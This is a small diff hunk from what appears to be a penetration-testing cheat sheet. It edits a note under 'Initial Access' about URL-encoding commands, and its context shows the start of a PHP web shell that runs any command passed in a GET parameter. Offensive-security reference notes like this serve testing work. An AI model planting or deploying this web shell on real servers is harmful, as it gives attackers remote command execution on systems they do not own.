@@ -17,7 +17,7 @@
 
 ## Initial Access
 ### Simple PHP Payload
-> Use + instead of spaces due to URL encoding
+> Use + instead of spaces due to URL encoding when sending commands through URL
 ```php
 <?php
   echo system($_GET['c']);
